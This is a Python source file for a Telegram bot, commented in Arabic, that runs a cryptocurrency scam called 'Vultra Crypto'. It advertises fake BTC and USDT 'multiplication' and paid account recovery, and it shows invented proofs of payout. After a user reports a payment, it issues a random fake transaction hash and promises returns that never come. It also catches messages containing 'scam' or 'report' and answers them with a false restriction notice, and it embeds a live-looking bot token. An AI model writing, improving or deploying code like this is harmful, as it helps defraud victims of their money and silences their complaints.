import logging, random, string, os
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

# ================== غيّر دول كل يوم بس ==================
TOKEN = "8209272245:AAEJPLlXe9r4GPHrbc148kC2989d6y3FrNg"   # التوكن بتاعك
YOUR_ID = 5895315536                                           # الـ ID بتاعك (هيجيلك إشعار بكل دفع)
WALLET_BTC = "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh"      # غيّره كل يوم بعنوان BTC جديد
WALLET_USDT = "TX12345678901234567890123456789012345678"        # غيّره كل يوم بعنوان USDT TRC20 جديد
# ============================================================

logging.basicConfig(level=logging.INFO)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("BTC ×1.5 Multiplication", callback_data="btc")],
        [InlineKeyboardButton("USDT ×3 Multiplication", callback_data="usdt")],
        [InlineKeyboardButton("Account Recovery Service", callback_data="recovery")],
        [InlineKeyboardButton("Live Proofs", callback_data="proof")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        "🔒 Welcome to Vultra Crypto\n\n"
        "Private multiplication & restricted account recovery service.\n\n"
        "Select service:", reply_markup=reply_markup
    )

async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    fake_tx = ''.join(random.choices(string.hexdigits.lower(), k=64))

    if query.data == "btc":
        await query.edit_message_text(
            f"🔥 BTC ×1.5 Multiplication\n\n"
            f"Minimum: 0.001 BTC\n\n"
            f"Wallet:\n`{WALLET_BTC}`\n\n"
            f"بعد التحويل اكتب:\n/paid 0.02 (أو أي مبلغ)\n\n"
            f"Processing: 8-12 minutes", parse_mode='Markdown')

    elif query.data == "usdt":
        await query.edit_message_text(
            f"🔥 USDT ×3 Multiplication (TRC20)\n\n"
            f"Minimum: 60 USDT\n\n"
            f"Wallet:\n`{WALLET_USDT}`\n\n"
            f"بعد التحويل اكتب:\n/paid 500 (أو أي مبلغ)", parse_mode='Markdown')

    elif query.data == "recovery":
        await query.edit_message_text(
            f"🔒 Account Recovery Service\n"
            f"Binance | Bybit | KuCoin (locked/restricted)\n\n"
            f"Fee: 390-990 USDT (حسب الحالة)\n\n"
            f"Wallet:\n`{WALLET_USDT}`\n\n"
            f"بعد الدفع ارسل الإيميل أو اليوزر", parse_mode='Markdown')

    elif query.data == "proof":
        await query.edit_message_text(
            "✅ Live Proofs (آخر ساعتين):\n\n"
            "• +0.037 BTC → returned 0.0555 BTC (7 min)\n"
            "• +1100 USDT → returned 3300 USDT (10 min)\n"
            "• Recovery fee 680 USDT → account unlocked + funds released\n\n"
            "القناة الكاملة: @VultraProofs"
        )

# كل ما حد يضغط /paid هيجيلك إشعار فوري + رد تلقائي للضحية
async def paid(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.message.from_user
    amount = " ".join(context.args) if context.args else "غير محدد"
    
    # إشعار لك أنت بالتفاصيل الكاملة
    try:
        await context.bot.send_message(YOUR_ID,
            f"🟢🟢🟢 دفع جديد وصل يا ملك!\n"
            f"من: {user.first_name} {user.last_name or ''}\n"
            f"يوزر: @{user.username or 'لا يوزر'}\n"
            f"ID: {user.id}\n"
            f"المبلغ المذكور: {amount}\n"
            f"الوقت: الحين بالثانية")
    except: pass

    fake_tx = ''.join(random.choices(string.hexdigits.lower(), k=64))
    await update.message.reply_text(
        f"✅ Payment received ({amount})\n\n"
        f"Transaction Hash:\n`{fake_tx}`\n\n"
        f"🔄 Processing your request...\n"
        f"Return will be sent automatically within 15 minutes.\n\n"
        f"Thank you for trusting Vultra Crypto.", parse_mode='Markdown')

async def main():
    app = Application.builder().token(TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(button))
    app.add_handler(CommandHandler("paid", paid))
    
    # حماية ضد الريبورت والسب
    app.add_handler(MessageHandler(filters.Regex(r'(نصب|scam|كذاب|report|احظر)'), 
                                  lambda u,c: u.message.reply_text("This user has been restricted.")))
    
    print("البوت شغال دلوقتي 24/7 يا ملك...")
    await app.run_polling()

if __name__ == '__main__':
    import asyncio
    asyncio.run(main())
